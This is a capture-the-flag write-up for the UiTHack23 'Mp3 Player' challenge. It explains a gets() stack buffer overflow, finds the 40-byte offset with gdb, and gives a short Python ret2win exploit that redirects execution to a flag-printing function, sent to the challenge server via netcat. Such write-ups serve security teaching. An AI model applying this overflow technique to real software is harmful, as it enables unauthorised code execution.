# Mp3 Player
This CTF challenge is a BOF exploit that redirects `rip` to some kind of `win()`. In this case, it is `call_me_maybe()`. 
## The Challenge
We found an old mp3 player laying around and decided to connect it to the internet for everyone to listen to its good ol' hits.
However, we might have messed up some of the instructions when setting it up...

You can connect to the Mp3 player with netcat
`$ nc motherload.td.org.uit.no 8006`

## The Solution
We can look at the given files `mp3_player.c` and `mp3_player` binary. It is crucial to make sure that the architecture of the computer is `x86_64` to be able to seamlessly execute the binary.
If one does not have such, one must configure their, for example, M1 mac to have some way to interpret the binary by using `qemu` along with `gdb` for easier reverse engineering. Opening the former, we are met with the following:
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

void ignore_me(){
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}

void timeout(int signal){
  if (signal == SIGALRM){
    printf("You timed out!\n");
    _exit(0);
  }
}

void ignore_me_timeout(){
  signal(SIGALRM, timeout);
  alarm(60);
}

void menu(){
  puts("Welcome to my online MP3 Player!\n");
  puts("Please choose the name of the song you want to play:\n");
  puts("- Photograph - Nickelback\n- Lose Yourself - Eminem\n- Mamma Mia - ABBA");
}

void photograph(){
  puts("So you can keep me");
  puts("Inside the pocket of your ripped jeans");
  puts("Holding me closer 'til our eyes meet");
  puts("You won't ever be alone");
}

void lose_yourself(){
  puts("You better lose yourself in the music");
  puts("The moment, you own it, you better never let it go");
  puts("You only get one shot, do not miss your chance to blow");
  puts("This opportunity comes once in a lifetime");
}

void mamma_mia(){
  puts("Mamma mia, here I go again");
  puts("My my, how can I resist you?");
  puts("Mamma mia, does it show again?");
  puts("My my, just how much I've missed you");
}

void call_me_maybe(){
  char chr;
  FILE *f = fopen("flag.txt", "r");
  chr = fgetc(f);
  while(chr != EOF){
    printf("%c", chr);
    chr = fgetc(f);
  }
  fclose(f);
}

void play_song(char *song){
  if(!strcmp(song, "Photograph")){
    photograph();
  }
  else if(!strcmp(song, "Lose Yourself")){
    lose_yourself();
  }
  else if(!strcmp(song, "Mamma Mia")){
    mamma_mia();
  }
  else {
    puts("Could not play the requested song");
  }
}

int main(){
  ignore_me();
  ignore_me_timeout();

  char song[30];
  menu();
  gets(song);
  play_song(song);
  return 0;
}
```
Nowhere in the program is `call_me_maybe()` function called. However, there is the vulnerable `gets()` function with an unrestricted amount of accepting input. Looking into the manual pages of `gets()`, one can read about the known vulnerabilities of this function especially when input sizes are not controlled.
This function would allow us to overflow the stack and redirect program execution. The `rip` pointer which points to the address of machine instruction lies right below the stack-buffer. So, by inspecting how much or the `offset` of the stack-buffer, we can control for the value that the `rip` points to.
We can find the offset using `gdb` by having some `cyclic` input to the buffer.

```console
┌──(ericjoshua㉿kali)-[~/Downloads]
└─$ qemu-x86_64-static -g 8888 mp3_player
Welcome to my online MP3 Player!

Please choose the name of the song you want to play:

- Photograph - Nickelback
- Lose Yourself - Eminem
- Mamma Mia - ABBA
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaaa
```
Analyzing this in gdb with `info registers`, we obtain the following:
```console
[!] Cannot access memory at address 0x6161616c6161616b
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, stopped 0x6161616c6161616b in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info registers
rax            0x0                 0x0
rbx            0x40007fff98        0x40007fff98
rcx            0xc00               0xc00
rdx            0x1                 0x1
rsi            0x1                 0x1
rdi            0x4000a24a10        0x4000a24a10
rbp            0x6161616a61616169  0x6161616a61616169
rsp            0x40007ffe90        0x40007ffe90
r8             0x0                 0x0
r9             0x0                 0x0
r10            0x4000868ee8        0x4000868ee8
r11            0x40009a54d0        0x40009a54d0
r12            0x0                 0x0
r13            0x40007fffa8        0x40007fffa8
r14            0x0                 0x0
r15            0x4000833020        0x4000833020
rip            0x6161616c6161616b  0x6161616c6161616b
```
Notice `rip => 0x6161616c6161616b` which suggests that `rip` starts receiving values at the input `0x6b` or `k`, don't forget little-endianness. This is at the 41st byte. In other words, our offset must be `40` bytes.
Great! the only thing we don't know is the address of call_me_maybe. This is easy enough with `disassemble call_me_maybe` which gives us the address `0x000000000040140f`. The reason for such a big address is because we are dealing with
a `64-bit` architecture. We can then write a simple exploit script.

```python
offset = 40
winaddress = "\x0f\x14\x40\x00\x00\x00\x00\x00" # 0x000000000040140f (little-endian)
print('A'*offset + winaddress)
```

We get the flag:
```console
┌──(ericjoshua㉿kali)-[~]
└─$ python3 exploit.py | nc motherload.td.org.uit.no 8006
Welcome to my online MP3 Player!

Please choose the name of the song you want to play:

- Photograph - Nickelback
- Lose Yourself - Eminem
- Mamma Mia - ABBA
Could not play the requested song
UiTHack23{H3r35_MY_4dDr355_50_caLL_M3_may83}
```
The flag is: `UiTHack23{H3r35_MY_4dDr355_50_caLL_M3_may83}`
